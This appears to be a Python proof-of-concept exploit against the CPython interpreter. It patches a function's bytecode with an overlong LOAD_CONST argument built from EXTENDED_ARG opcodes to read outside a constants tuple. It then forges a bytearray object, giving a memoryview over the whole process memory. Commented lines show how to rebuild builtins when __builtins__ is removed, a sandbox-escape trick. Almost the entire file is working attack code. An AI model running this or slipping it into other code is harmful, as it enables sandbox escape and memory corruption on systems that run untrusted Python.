'''
An out of bounds read is performed on a tuple co_consts
to perform the read, EXTENDED_ARG opcodes are used to produce the correct offset
if the offset is negative, the offset is overflowed (using a bug in the implementation of EXTENDED_ARG)
The out of bounds read is done by using `LOAD_CONST` with an overlong argument
'''
#The following allows this exploit to function without the `__builtins__` module
#type = ().__class__.__class__
#object = type.__base__
#int = type(0)
#id = lambda o:int(object.__repr__(o).split()[-1][:-1], 16)
#g = lambda n,b=object:{c.__name__:c for c in type(b).__subclasses__(b)}[n]
#bytes = type(b'')
#bytearray = g('bytearray')
#memoryview = g('memoryview')

def sizeof(obj):
    return type(obj).__sizeof__(obj)

TUPLE_HEADER = sizeof(())
BYTES_HEADER = sizeof(b'') - 1
PTR_SIZE = sizeof((0,)) - TUPLE_HEADER
MAX_INT =  (1 << PTR_SIZE * 8 - 1) - 1

def load_addr(addr):
    magic = lambda:None # this functions bytecode gets patched
    b_addr = addr.to_bytes(PTR_SIZE, 'little') # convert int to bytes (bytes values are held raw in memory)
    offset = id(b_addr) + BYTES_HEADER # start of raw addr in memory
    offset -= id(magic.__code__.co_consts) + TUPLE_HEADER # get distance from start of `co_consts tuple`
    offset //= PTR_SIZE # offset has to be evenly dividable by `PTR_SIZE` as `PyTuple_GET_ITEM` indexes by `PTR_SIZE`
    if offset < 0: # if address is located before the tuple overflow offset to convert to unsigned
        # this works because opcode arguments are held in a signed int (4 bytes)
        # `EXTENDED_ARG` does not check against signed overflow
        offset += 0xffffffff + 1
    co_code = bytes((0x64, offset & 0xff, 0x53, 0)) # LOAD_CONST, last byte of offset, `RETURN_VALUE`, 0
    offset >>= 8 # shift offset by 8 to drop last byte
    while offset > 0: # loop until offset is 0
        co_code = bytes((0x90, offset & 0xff)) + co_code # EXTENDED_ARG, last byte of shifted offset
        offset >>= 8 # shift offset by 8 to drop last byte
    magic.__code__ = magic.__code__.replace(
        co_code=co_code # inject generated bytecode
    )
    return magic() # trigger the bug

def make_getmem():
    memory_backing = b''.join(n.to_bytes(PTR_SIZE, 'little') for n in (
        1,
        id(bytearray),
        MAX_INT,
        0, 0, 0, 0
    ))

    memory = memoryview(load_addr(id(memory_backing) + BYTES_HEADER))

    def getmem(start, size, _=memory_backing):
        return memory[start:start + size]
    return getmem

getmem = make_getmem()
